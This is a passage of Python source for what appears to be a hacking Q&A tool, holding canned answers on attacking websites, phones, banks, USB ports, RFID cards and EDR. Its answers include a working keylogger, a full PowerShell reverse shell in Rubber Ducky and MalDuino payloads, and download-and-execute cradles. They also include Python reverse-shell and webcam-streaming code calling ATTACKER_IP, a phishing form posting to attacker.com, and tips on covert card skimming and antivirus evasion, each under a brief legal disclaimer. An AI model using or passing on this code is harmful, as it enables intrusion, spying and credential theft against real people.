                                      f"{Colors.YELLOW}  Command Sample:{Colors.END} reaver -i wlan0mon -b [BSSID] -vv\n\n"
                                      f"{Colors.GREEN}• Deauthentication Attack:{Colors.END} Force users to disconnect to capture handshakes or redirect them.\n"
                                      f"{Colors.YELLOW}  Tool Example:{Colors.END} aireplay-ng, MDK4\n"
                                      f"{Colors.YELLOW}  Command Sample:{Colors.END} aireplay-ng --deauth 100 -a [BSSID] wlan0mon\n\n"
                                      f"{Colors.CYAN}Note:{Colors.END} Only perform these in ethical pentesting labs or with proper authorization!",
        
         
 


        
            "how to hack websites": f"{Colors.CYAN}Website Hacking Techniques (Offensive Scope Only):{Colors.END}\n"
                                  f"{Colors.GREEN}• SQL Injection (SQLi):{Colors.END} Inject SQL payloads into input fields to manipulate backend databases.\n"
                                  f"{Colors.YELLOW}  Example Payload:{Colors.END} ' OR '1'='1 --\n"
                                  f"{Colors.YELLOW}  Tools:{Colors.END} sqlmap, Havij, NoSQLMap\n"
                                  f"{Colors.YELLOW}  sqlmap sample:{Colors.END} sqlmap -u \"http://site.com/page.php?id=1\" --dbs\n\n"
                                  f"{Colors.GREEN}• Cross-Site Scripting (XSS):{Colors.END} Inject malicious scripts into web apps to execute in victim browsers.\n"
                                  f"{Colors.YELLOW}  Example Payload:{Colors.END} <script>alert('XSS')</script>\n"
                                  f"{Colors.YELLOW}  Tools:{Colors.END} XSSer, BeEF\n\n"
                                  f"{Colors.GREEN}• Remote File Inclusion (RFI):{Colors.END} Include external scripts via URL parameter.\n"
                                  f"{Colors.YELLOW}  Example Payload:{Colors.END} page=http://evil.com/shell.txt\n"
                                  f"{Colors.YELLOW}  Tools:{Colors.END} c99shell, r57shell\n\n"
                                  f"{Colors.GREEN}• Command Injection:{Colors.END} Inject system commands through poorly filtered input.\n"
                                  f"{Colors.YELLOW}  Example Payload:{Colors.END} ; ls -la\n"
                                  f"{Colors.YELLOW}  Tools:{Colors.END} Commix, Burp Suite Intruder\n\n"
                                  f"{Colors.GREEN}• Directory Traversal:{Colors.END} Access unauthorized files by manipulating file paths.\n"
                                  f"{Colors.YELLOW}  Example Payload:{Colors.END} ../../../../etc/passwd\n"
                                  f"{Colors.YELLOW}  Tool-free Exploit (Manual)\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} Use only for educational, lab-based or legal pentesting purposes!",






        
            "how to use keylogger": f"{Colors.CYAN}Keylogger Techniques:{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} Keyloggers capture keystrokes on a target machine, recording passwords, messages, and other sensitive data.\n\n"
                                  f"{Colors.GREEN}• Software Keylogger Example:{Colors.END}\n"
                                  f"{Colors.YELLOW}  - Tools: logkeys (Linux), PyKeylogger (Python)\n"
                                  f"  - Usage: Run in background to silently log keystrokes to a file.\n\n"
                                  f"{Colors.GREEN}• Simple Python Keylogger Code Example:{Colors.END}\n"
                                  f"{Colors.YELLOW}  import pynput\n"
                                  f"  from pynput.keyboard import Key, Listener\n\n"
                                  f"  # Function to write pressed keys to a file\n"
                                  f"  def on_press(key):\n"
                                  f"      with open('keylog.txt', 'a') as log_file:\n"
                                  f"          try:\n"
                                  f"              log_file.write(key.char)\n"
                                  f"          except AttributeError:\n"
                                  f"              if key == Key.space:\n"
                                  f"                  log_file.write(' ')\n"
                                  f"              else:\n"
                                  f"                  log_file.write(f' [{{key}}] ')\n\n"
                                  f"  # Set up the listener\n"
                                  f"  with Listener(on_press=on_press) as listener:\n"
                                  f"      listener.join()\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} Always have permission before using keyloggers to avoid legal issues.",
     





            "how to hack using hid payload injection (malduino edition)": f"{Colors.CYAN}How To Hack Using HID Payload Injection (MalDuino Edition):{Colors.END}\n"
                                                              f"{Colors.GREEN}• Description:{Colors.END} HID-based attacks inject malicious keystrokes via USB, impersonating a keyboard. MalDuino allows custom payload delivery into Windows/Linux systems silently.\n\n"
                                                              f"{Colors.GREEN}• Setup Requirements:{Colors.END}\n"
                                                              f"{Colors.YELLOW}  • MalDuino flashed with Arduino HID payload.\n"
                                                              f"  • Physical access to target system.\n"
                                                              f"  • Listener or payload dropper ready on remote system.\n\n"
                                                              f"{Colors.GREEN}• Sample MalDuino Payload (Windows Reverse Shell):{Colors.END}\n"
                                                              f"{Colors.YELLOW}  delay(2000);\n"
                                                              f"  Keyboard.press(KEY_LEFT_GUI);\n"
                                                              f"  Keyboard.print(\"r\");\n"
                                                              f"  Keyboard.releaseAll();\n"
                                                              f"  delay(1000);\n"
                                                              f"  Keyboard.println(\"powershell -WindowStyle Hidden -Command \\\"\");\n"
                                                              f"  delay(300);\n"
                                                              f"  Keyboard.println(\"$c=New-Object Net.Sockets.TCPClient('10.0.0.6',4444);$s=$c.GetStream();...\\\"\");\n"
                                                              f"  // Continue with full reverse shell script split into parts\n\n"
                                                              f"{Colors.GREEN}• Listener Example:{Colors.END}\n"
                                                              f"{Colors.YELLOW}  nc -lvnp 4444\n\n"
                                                              f"{Colors.GREEN}• Advanced Tips:{Colors.END}\n"
                                                              f"{Colors.YELLOW}  • Split long scripts into small keyboard.println() chunks.\n"
                                                              f"  • Obfuscate PowerShell to evade EDR logging.\n"
                                                              f"  • Insert delays for reliability on slower systems.\n\n"
                                                              f"{Colors.GREEN}• Defenses:{Colors.END}\n"
                                                              f"{Colors.YELLOW}  • Enforce USB device control policies (disable new HID).\n"
                                                              f"  • Monitor PowerShell and unusual keyboard input spikes.\n"
                                                              f"  • Use endpoint detection to catch USB-based payloads.\n\n"
                                                              f"{Colors.CYAN}Note:{Colors.END} USB HID attacks should only be practiced in lab setups or red-team authorized engagements.",
     
        

            "how to hack using bash bunny multi-payload injection": f"{Colors.CYAN}How To Hack Using Bash Bunny Multi-Payload Injection:{Colors.END}\n"
                                                        f"{Colors.GREEN}• Description:{Colors.END} Bash Bunny is a multi-function USB attack platform that can emulate HID, storage, and Ethernet, enabling payload chaining and complex attacks.\n\n"
                                                        f"{Colors.GREEN}• Capabilities:{Colors.END}\n"
                                                        f"{Colors.YELLOW}  • Emulate multiple USB devices (keyboard, NIC, mass storage).\n"
                                                        f"  • Run payloads like keystroke injection, DNS spoofing, or SMB exfiltration.\n"
                                                        f"  • Support multi-stage execution: drop, execute, exfiltrate.\n\n"
                                                        f"{Colors.GREEN}• Sample Payload – Dumping Password Hashes (Windows):{Colors.END}\n"
                                                        f"{Colors.YELLOW}  ATTACKMODE HID STORAGE\n"
                                                        f"  LED ATTACK\n"
                                                        f"  Q DELAY 2000\n"
                                                        f"  Q GUI r\n"
                                                        f"  Q STRING powershell -WindowStyle Hidden -Command \"Invoke-Command {{`Get-LocalUser | Format-Table`}}\"\n"
                                                        f"  Q ENTER\n"
                                                        f"  LED FINISH\n\n"
                                                        f"{Colors.GREEN}• Advanced Use Cases:{Colors.END}\n"
                                                        f"{Colors.YELLOW}  • SMB credential capture over emulated NIC.\n"
                                                        f"  • Data exfiltration via mounted USB storage.\n"
                                                        f"  • Covert persistence via registry or scheduled tasks.\n\n"
                                                        f"{Colors.GREEN}• Payload Organization:{Colors.END}\n"
                                                        f"{Colors.YELLOW}  • Use switch position folders (/payloads/switch1/).\n"
                                                        f"  • Separate stages: e.g., dropper.sh → command.ps1 → cleanup.sh.\n\n"
                                                        f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                                        f"{Colors.YELLOW}  • Lock USB ports to known hardware IDs.\n"
                                                        f"  • Monitor for rogue network interfaces.\n"
                                                        f"  • Audit autorun and PowerShell history.\n\n"
                                                        f"{Colors.CYAN}Note:{Colors.END} Bash Bunny is powerful for red teams but can be dangerous in the wrong hands. Always test responsibly in sandboxed environments.",
              


            "how to hack using usb dead drop": f"{Colors.CYAN}How To Hack Using USB Dead Drop:{Colors.END}\n"
                                    f"{Colors.GREEN}• Description:{Colors.END} A USB dead drop is a technique where a malicious USB is planted in a target area, relying on human curiosity to trigger execution once plugged in.\n\n"
                                    f"{Colors.GREEN}• Objective:{Colors.END} Deliver malware payloads or collect data from unsuspecting users.\n\n"
                                    f"{Colors.GREEN}• Typical Payloads:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Auto-run malware with LNK or HTA files.\n"
                                    f"  • HID emulation (e.g., Rubber Ducky) to inject commands.\n"
                                    f"  • Data collectors (WiFi passwords, screenshots, keystrokes).\n\n"
                                    f"{Colors.GREEN}• Example Auto-Execution (HTA Loader):{Colors.END}\n"
                                    f"{Colors.YELLOW}  [autorun.inf]\n"
                                    f"  label=Open Files\n"
                                    f"  icon=icon.ico\n"
                                    f"  shellexecute=payload.hta\n\n"
                                    f"{Colors.GREEN}• Tips for Maximum Impact:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Use social engineering (label as “confidential”, “payroll”, etc).\n"
                                    f"  • Encrypt payloads to evade AV detection.\n"
                                    f"  • Use multiple file types (PDF, DOC, LNK) as lures.\n\n"
                                    f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Disable USB autorun via Group Policy.\n"
                                    f"  • Enforce endpoint protection to scan inserted USB devices.\n"
                                    f"  • Train employees to avoid unknown USB drives.\n\n"
                                    f"{Colors.CYAN}Note:{Colors.END} Dead drop attacks rely heavily on human behavior. Awareness and policy enforcement are the best defense.",




            "how to evade antivirus with usb hid": f"{Colors.CYAN}How To Evade Antivirus With USB HID:{Colors.END}\n"
                                        f"{Colors.GREEN}• Description:{Colors.END} USB HID (Human Interface Device) emulates a keyboard/mouse to inject payloads. Since it mimics human input, most AVs don’t flag it.\n\n"
                                        f"{Colors.GREEN}• Objective:{Colors.END} Deliver payloads directly via keystroke injection, bypassing traditional antivirus signature and behavioral scanning.\n\n"
                                        f"{Colors.GREEN}• Typical Tools:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Rubber Ducky / Digispark / MalDuino\n"
                                        f"  • DuckEncoder for compiling payloads\n"
                                        f"  • obfuscate.ps1 for AV evasion\n\n"
                                        f"{Colors.GREEN}• Sample Obfuscated PowerShell Payload:{Colors.END}\n"
                                        f"{Colors.YELLOW}  powershell -nop -w hidden -e {Colors.END} [Base64EncodedPayload]\n"
                                        f"{Colors.YELLOW}  Example:\n"
                                        f"  powershell -w hidden -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"\n\n"
                                        f"{Colors.GREEN}• HID Injection Example (Ducky Script):{Colors.END}\n"
                                        f"{Colors.YELLOW}  DELAY 500\n"
                                        f"  GUI r\n"
                                        f"  DELAY 300\n"
                                        f"  STRING powershell -nop -w hidden -e ...\n"
                                        f"  ENTER\n\n"
                                        f"{Colors.GREEN}• Bypass Techniques:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Use PowerShell obfuscation tools (e.g., Invoke-Obfuscation)\n"
                                        f"  • Encode payloads with Base64 or XOR layers\n"
                                        f"  • Avoid common keywords like ‘DownloadString’, ‘Invoke’, ‘Shell’\n\n"
                                        f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Disable USB ports or restrict HID devices via Group Policy.\n"
                                        f"  • Use behavior-based EDR solutions.\n"
                                        f"  • Monitor PowerShell execution via script block logging.\n\n"
                                        f"{Colors.CYAN}Note:{Colors.END} HID attacks are stealthy and hardware-driven — best prevented by controlling physical access and USB usage policies.",




            "how to clone rfid/nfc cards": f"{Colors.CYAN}How To Clone RFID/NFC Cards:{Colors.END}\n"
                                f"{Colors.GREEN}• Description:{Colors.END} RFID (Radio-Frequency Identification) and NFC (Near Field Communication) cards are used for access control, payments, and ID. Cloning involves reading card data and writing it to a blank tag.\n\n"
                                f"{Colors.GREEN}• Tools Needed:{Colors.END}\n"
                                f"{Colors.YELLOW}  • Proxmark3 - For advanced RFID/NFC sniffing and cloning\n"
                                f"  • ChameleonMini - For emulating cloned cards\n"
                                f"  • NFC Tools App - For basic read/write on Android (limited)\n\n"
                                f"{Colors.GREEN}• Supported Protocols:{Colors.END}\n"
                                f"{Colors.YELLOW}  • 125kHz LF - EM4100, HID Prox\n"
                                f"  • 13.56MHz HF - MIFARE Classic (often vulnerable), NTAG\n\n"
                                f"{Colors.GREEN}• Cloning Example With Proxmark3:{Colors.END}\n"
                                f"{Colors.YELLOW}  hf search\n"
                                f"  hf mf dump 1\n"
                                f"  hf mf restore 1\n\n"
                                f"{Colors.GREEN}• Bypass Techniques:{Colors.END}\n"
                                f"{Colors.YELLOW}  • Exploit weak keys (MIFARE Classic uses static keys like FFFFFFFFFFFF)\n"
                                f"  • Use nested attacks to dump secured sectors\n"
                                f"  • Replay data to emulate original card\n\n"
                                f"{Colors.GREEN}• Real-World Attack Scenario:{Colors.END}\n"
                                f"{Colors.YELLOW}  1. Approach victim's card in a crowded place (with Proxmark/NFC reader in bag)\n"
                                f"  2. Read card data silently\n"
                                f"  3. Clone to a blank tag using same UID\n"
                                f"  4. Gain unauthorized building access\n\n"
                                f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                f"{Colors.YELLOW}  • Upgrade to encrypted smart cards (e.g., MIFARE DESFire EV2)\n"
                                f"  • Monitor access logs for cloned UID reuse\n"
                                f"  • Implement two-factor authentication at entry points\n\n"
                                f"{Colors.CYAN}Note:{Colors.END} Cloning RFID without permission is illegal. This knowledge is for authorized testing and red teaming only.",




            "how to hack air-gapped machines using usb": f"{Colors.CYAN}How To Hack Air-Gapped Machines Using USB:{Colors.END}\n"
                                            f"{Colors.GREEN}• Description:{Colors.END} Air-gapped systems are isolated from networks for security. However, malware can still be introduced via physical vectors like USB drives.\n\n"
                                            f"{Colors.GREEN}• Known Techniques:{Colors.END}\n"
                                            f"{Colors.YELLOW}  1. USB Drop Attacks — Leave infected USBs in target areas.\n"
                                            f"  2. HID Attacks — Emulate keyboard input to execute payloads (e.g., Rubber Ducky).\n"
                                            f"  3. USB Autorun Payloads (Old Systems) — Use autorun.inf + executable (less effective now).\n"
                                            f"  4. BadUSB — Modify USB firmware to act as trusted device but inject malicious behavior.\n"
                                            f"  5. Data Exfiltration via Covert Channels — Blinking LEDs, acoustic signals, power fluctuations.\n\n"
                                            f"{Colors.GREEN}• Sample Rubber Ducky Payload (Windows):{Colors.END}\n"
                                            f"{Colors.YELLOW}  DELAY 1000\n"
                                            f"  GUI r\n"
                                            f"  DELAY 500\n"
                                            f"  STRING powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')\"\n"
                                            f"  ENTER\n\n"
                                            f"{Colors.GREEN}• Delivery Strategy:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Embed ducky-style payload in disguised USB.\n"
                                            f"  • Drop near target facility with labels like “confidential”, “HR files”, “Bonuses 2025”.\n"
                                            f"  • Exploit human curiosity for plug-in.\n\n"
                                            f"{Colors.GREEN}• Advanced Concepts:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Use signal-based exfiltration (e.g., LED flicker to nearby camera).\n"
                                            f"  • PowerHammer: Exfiltrate via power line fluctuations.\n"
                                            f"  • USBee: Exfiltrate via electromagnetic interference.\n\n"
                                            f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                            f"{Colors.YELLOW}  • Disable USB ports via BIOS or endpoint security.\n"
                                            f"  • Monitor for unauthorized USB insertions (via SIEM).\n"
                                            f"  • Train employees not to insert unverified USB drives.\n"
                                            f"  • Use USB whitelisting (only approved serials).\n\n"
                                            f"{Colors.CYAN}Note:{Colors.END} Attacking air-gapped systems is considered an advanced red-team tactic. Always test in isolated labs or with proper authorization only.",




            "how to spy camera": f"{Colors.CYAN}Spy Camera Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Description:{Colors.END} Techniques to access and control someone’s camera remotely without their consent, often through malware or exploiting vulnerabilities.\n\n"
                               f"{Colors.GREEN}• Common Methods:{Colors.END}\n"
                               f"{Colors.YELLOW}  1. Remote Access Trojans (RATs): Malware that gives full control over victim's device, including camera.\n"
                               f"  2. Exploiting IP Camera vulnerabilities: Using weak/default passwords or unpatched firmware.\n"
                               f"  3. Malicious apps: Apps requesting camera permissions for spying.\n\n"
                               f"{Colors.GREEN}• Example Malicious Code Snippet (conceptual Python RAT camera access):{Colors.END}\n"
                               f"{Colors.YELLOW}  import cv2\n"
                               f"  import socket\n"
                               f"\n"
                               f"  # Connect to attacker server\n"
                               f"  s = socket.socket()\n"
                               f"  s.connect(('ATTACKER_IP', 9999))  # Replace with attacker's IP\n"
                               f"\n"
                               f"  cap = cv2.VideoCapture(0)  # Access webcam\n"
                               f"  while True:\n"
                               f"      ret, frame = cap.read()\n"
                               f"      if not ret:\n"
                               f"          break\n"
                               f"      # Encode frame and send\n"
                               f"      _, buffer = cv2.imencode('.jpg', frame)\n"
                               f"      s.sendall(buffer.tobytes())\n"
                               f"\n"
                               f"  cap.release()\n"
                               f"  s.close()\n\n"
                               f"{Colors.CYAN}Note:{Colors.END} This is a simplified conceptual example. Actual RATs have more sophisticated communication and encryption.\n"
                               f"Always obtain explicit permission before testing such techniques to avoid legal consequences.",




            "how to hack using badusb": f"{Colors.CYAN}How To Hack Using BadUSB:{Colors.END}\n"
                            f"{Colors.GREEN}• Description:{Colors.END} BadUSB attacks exploit USB devices reprogrammed to behave as Human Interface Devices (HID), allowing automated keystroke injection into target systems.\n\n"
                            f"{Colors.GREEN}• Use Cases:{Colors.END}\n"
                            f"{Colors.YELLOW}  1. Automated command execution.\n"
                            f"  2. Download and execution of payloads.\n"
                            f"  3. Credential harvesting or backdoor installation.\n\n"
                            f"{Colors.GREEN}• Popular Devices:{Colors.END}\n"
                            f"{Colors.YELLOW}  • Rubber Ducky\n"
                            f"  • Digispark ATTiny85\n"
                            f"  • MalDuino\n"
                            f"  • Bash Bunny\n\n"
                            f"{Colors.GREEN}• Example Payload (Rubber Ducky):{Colors.END}\n"
                            f"{Colors.YELLOW}  DELAY 1000\n"
                            f"  GUI r\n"
                            f"  STRING powershell -w hidden -c \"iwr http://10.0.0.5/p.exe -OutFile $env:temp\\p.exe; Start-Process $env:temp\\p.exe\"\n"
                            f"  ENTER\n\n"
                            f"{Colors.GREEN}• Tips for Realistic Attacks:{Colors.END}\n"
                            f"{Colors.YELLOW}  • Mimic human typing speed (add delays).\n"
                            f"  • Obfuscate PowerShell commands.\n"
                            f"  • Target unlocked systems with USB access.\n\n"
                            f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                            f"{Colors.YELLOW}  • Disable unused USB ports in BIOS.\n"
                            f"  • Use endpoint security with HID restrictions.\n"
                            f"  • Lock workstations when unattended.\n\n"
                            f"{Colors.CYAN}Note:{Colors.END} BadUSB attacks are powerful and should only be tested on devices you own or have explicit permission to audit.",




            "how to hack using usb rubber ducky with reverse shell": f"{Colors.CYAN}How To Hack Using USB Rubber Ducky With Reverse Shell:{Colors.END}\n"
                                                         f"{Colors.GREEN}• Description:{Colors.END} Rubber Ducky can inject keystrokes to open a terminal and create a reverse shell connection to your listener (attacker machine).\n\n"
                                                         f"{Colors.GREEN}• Prerequisites:{Colors.END}\n"
                                                         f"{Colors.YELLOW}  • USB Rubber Ducky with payload encoded (DuckyScript).\n"
                                                         f"  • Attacker listener setup (e.g., Netcat or Metasploit).\n"
                                                         f"  • Target device with open internet access or LAN route.\n\n"
                                                         f"{Colors.GREEN}• Example Payload (Windows):{Colors.END}\n"
                                                         f"{Colors.YELLOW}  DELAY 1000\n"
                                                         f"  GUI r\n"
                                                         f"  STRING cmd /k\n"
                                                         f"  ENTER\n"
                                                         f"  DELAY 500\n"
                                                         f"  STRING powershell -w hidden -c \"$client = New-Object Net.Sockets.TCPClient('10.0.0.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"\n"
                                                         f"  ENTER\n\n"
                                                         f"{Colors.GREEN}• Attacker Side (Netcat Listener):{Colors.END}\n"
                                                         f"{Colors.YELLOW}  nc -lvnp 4444\n\n"
                                                         f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                                         f"{Colors.YELLOW}  • Disable PowerShell or restrict script execution policy.\n"
                                                         f"  • Monitor for suspicious outbound connections.\n"
                                                         f"  • Block unknown USB HID devices.\n\n"
                                                         f"{Colors.CYAN}Note:{Colors.END} Always test within your own systems or lab environments. USB attacks on unauthorized systems are illegal.",


            "how to hack phone": f"{Colors.CYAN}Phone Hacking Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Description:{Colors.END} Methods used to gain unauthorized access to mobile devices to steal data, monitor activity, or control the phone remotely.\n\n"
                               f"{Colors.GREEN}• Common Methods:{Colors.END}\n"
                               f"{Colors.YELLOW}  1. Phishing & Social Engineering: Tricks user into installing malware or revealing credentials.\n"
                               f"  2. Exploiting Vulnerabilities: Using OS or app security flaws (e.g., zero-days).\n"
                               f"  3. Installing Spyware or RATs: Apps that secretly record activity or give remote control.\n"
                               f"  4. Brute Force PIN or Passwords: Guessing lockscreen codes.\n"
                               f"  5. Man-in-the-Middle Attacks on Wi-Fi: Intercepting phone data over insecure networks.\n\n"
                               f"{Colors.GREEN}• Example Malicious Code Snippet (Python Conceptual Spy App):{Colors.END}\n"
                               f"{Colors.YELLOW}import socket\n"
                               f"import subprocess\n"
                               f"import platform\n"
                               f"\n"
                               f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                               f"s.connect(('ATTACKER_IP', 9999))  # Replace with attacker IP\n"
                               f"\n"
                               f"while True:\n"
                               f"    command = s.recv(1024).decode()\n"
                               f"    if command.lower() == 'exit':\n"
                               f"        break\n"
                               f"    output = subprocess.getoutput(command)\n"
                               f"    s.send(output.encode())\n"
                               f"\n"
                               f"s.close()\n\n"
                               f"{Colors.CYAN}Note:{Colors.END} This is a simplified example for educational use only. Real phone hacking tools use obfuscation, encryption, and advanced exploits.\n"
                               f"Always have permission before testing.",







            "how to hack whatsapp": f"{Colors.CYAN}WhatsApp Hacking Techniques:{Colors.END}\n"
                                  f"{Colors.GREEN}• Session Hijacking:{Colors.END} Intercepting QR code login requests or session tokens from WhatsApp Web to gain access without password.\n"
                                  f"{Colors.GREEN}• Social Engineering:{Colors.END} Tricking the target into revealing 6-digit OTP sent via SMS during login attempt.\n"
                                  f"{Colors.GREEN}• WhatsApp Web Cloning:{Colors.END} Scanning QR code directly from victim’s phone to mirror the session.\n"
                                  f"{Colors.GREEN}• Remote Access Trojans (RATs):{Colors.END} Installing backdoors or remote control apps on target phone to read messages.\n"
                                  f"{Colors.GREEN}• Exploiting WhatsApp Web Caching:{Colors.END} Accessing browser cache/session storage if device is left unlocked.\n\n"
                                  f"{Colors.RED}Example Tools:{Colors.END} QRJacking Scripts, Evilginx, AndroRAT, WhatsApp Sniffer (for rooted devices), Metasploit\n\n"
                                  f"{Colors.RED} Note:{Colors.END} All these techniques are shared **strictly for educational and ethical hacking awareness purposes** only.",

 





        
            "how to hack bank": f"{Colors.CYAN}Bank Hacking Techniques (For Educational Use Only):{Colors.END}\n"
                              f"{Colors.GREEN}• Phishing and Fake Login Pages:{Colors.END} Creating fake bank login pages to steal credentials via emails or SMS spoofing.\n"
                              f"{Colors.GREEN}• Man-in-the-Browser (MitB):{Colors.END} Injecting malicious browser extensions or scripts to alter transactions in real-time.\n"
                              f"{Colors.GREEN}• Banking Trojans:{Colors.END} Malware like Zeus, Dridex, or TrickBot used to steal online banking credentials.\n"
                              f"{Colors.GREEN}• ATM Malware:{Colors.END} Infecting ATMs with malware (e.g. Ploutus, Tyupkin) to dispense cash or steal card data.\n"
                              f"{Colors.GREEN}• SIM Swapping:{Colors.END} Hijacking phone numbers to intercept banking OTPs and 2FA codes.\n"
                              f"{Colors.GREEN}• Credential Stuffing:{Colors.END} Using leaked credentials from other platforms to brute-force bank logins.\n"
                              f"{Colors.GREEN}• SQL Injection on banking portals:{Colors.END} Targeting vulnerable banking apps/databases to extract sensitive financial data.\n\n"
                              f"{Colors.RED}Example Tools:{Colors.END} Evilginx, Browser Exploitation Framework (BeEF), Mimikatz, Metasploit, Hydra, Zeus Trojan\n\n"
                              f"{Colors.RED}Example Code Snippet (Phishing HTML):{Colors.END}\n"
                              f"{Colors.YELLOW}<form action='https://attacker.com/steal' method='post'>{Colors.END}\n"
                              f"{Colors.YELLOW}  <input type='text' name='username' placeholder='Bank Username'>{Colors.END}\n"
                              f"{Colors.YELLOW}  <input type='password' name='password' placeholder='Password'>{Colors.END}\n"
                              f"{Colors.YELLOW}  <button type='submit'>Login</button>{Colors.END}\n"
                              f"{Colors.YELLOW}</form>{Colors.END}\n\n"
                              f"{Colors.RED} Warning:{Colors.END} This information is strictly for red teaming, cybersecurity awareness, and educational use only. Unauthorized access to banking systems is illegal.",

 


            "how to hack using web cache poisoning": f"{Colors.CYAN}How To Hack Using Web Cache Poisoning:{Colors.END}\n"
                                         f"{Colors.GREEN}• Description:{Colors.END} Web Cache Poisoning is an attack where an attacker manipulates the caching mechanism of a web server or CDN to serve malicious content to other users.\n\n"
                                         f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                         f"{Colors.YELLOW}  1. Attacker sends a specially crafted request to the web server.\n"
                                         f"  2. The cache stores the malicious response.\n"
                                         f"  3. Subsequent users receive the poisoned cached content instead of the legitimate content.\n\n"
                                         f"{Colors.GREEN}• Common Targets:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Websites using reverse proxies or CDNs (like Cloudflare).\n"
                                         f"  • Web pages with dynamic content improperly cached.\n\n"
                                         f"{Colors.GREEN}• Typical Attack Vectors:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Injecting malicious scripts or HTML into cached pages.\n"
                                         f"  • Exploiting improper cache key management.\n\n"
                                         f"{Colors.GREEN}• Example Scenario:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Attacker adds a special header or parameter causing cache to store malicious JavaScript.\n"
                                         f"  • Other users then receive the malicious script on visiting the page.\n\n"
                                         f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                         f"{Colors.YELLOW}  • Avoid caching responses with user-specific or dynamic content.\n"
                                         f"  • Implement proper cache key validation.\n"
                                         f"  • Use cache-control headers correctly (e.g., no-store, private).\n"
                                         f"  • Regularly audit cache configuration and logs.\n\n"
                                         f"{Colors.CYAN}Note:{Colors.END} Always perform such tests with explicit authorization to avoid legal issues.",

 


            "how to hack with steganography": f"{Colors.CYAN}How To Hack With Steganography (Hide Payloads in Media):{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} Steganography is the technique of hiding malicious payloads or data within innocuous media files (images, audio, video) to avoid detection by security systems.\n\n"
                                  f"{Colors.GREEN}• Common Methods:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. LSB (Least Significant Bit) Encoding: Modifying the least significant bits of image pixels to embed data.\n"
                                  f"  2. Audio steganography: Embedding data within audio signals without perceptible changes.\n"
                                  f"  3. Video steganography: Hiding payloads within video frames.\n\n"
                                  f"{Colors.GREEN}• Tools Often Used:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Steghide: Command-line tool for embedding data into images and audio.\n"
                                  f"  • OpenStego: GUI tool for image steganography.\n"
                                  f"  • OutGuess: Another tool for hiding data in images.\n\n"
                                  f"{Colors.GREEN}• Basic Example Using Steghide:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • To embed a payload:\n"
                                  f"    steghide embed -cf cover.jpg -ef payload.txt\n"
                                  f"  • To extract the payload:\n"
                                  f"    steghide extract -sf cover.jpg\n\n"
                                  f"{Colors.GREEN}• Usage Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Choose large media files to avoid noticeable changes.\n"
                                  f"  • Use encryption on the payload before embedding.\n"
                                  f"  • Avoid repeatedly using the same cover file to evade detection.\n\n"
                                  f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Monitor for unusual media file sizes or checksum changes.\n"
                                  f"  • Use steganalysis tools to detect hidden data.\n"
                                  f"  • Implement strict filtering on incoming files.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} Always get explicit authorization before testing steganography hacking techniques.",
 



            "how to bypass edr detection": f"{Colors.CYAN}Bypassing EDR (Endpoint Detection & Response) Systems:{Colors.END}\n"
                            f"{Colors.GREEN}• Description:{Colors.END} Techniques used by advanced threat actors to evade EDR systems that monitor, log, and respond to suspicious behavior on endpoints in real time.\n\n"
                            f"{Colors.GREEN}• Common Evasion Techniques:{Colors.END}\n"
                            f"{Colors.YELLOW}  1. API Unhooking: Replacing user-mode hooks set by EDR to hide malicious behavior.\n"
                            f"  2. Shellcode Obfuscation: Using encryption and runtime decoding to hide shellcode.\n"
                            f"  3. Reflective DLL Injection: Injecting malicious DLLs into memory without touching disk.\n"
                            f"  4. Process Hollowing: Replacing memory of a legitimate process with malicious code.\n"
                            f"  5. Parent Process Spoofing: Launching payloads under trusted parent processes like explorer.exe.\n"
                            f"  6. LOLBins (Living Off The Land Binaries): Abusing trusted Windows binaries to execute malicious code.\n"
                            f"  7. Syscalls (Direct System Calls): Bypassing user-mode API detection by calling native system calls directly.\n\n"
                            f"{Colors.GREEN}• Example: Manual Syscall Execution in Python Using ctypes (simplified):{Colors.END}\n"
                            f"{Colors.YELLOW}  import ctypes\n"
                            f"  from ctypes import wintypes\n"
                            f"\n"
                            f"  VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc\n"
                            f"  RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory\n"
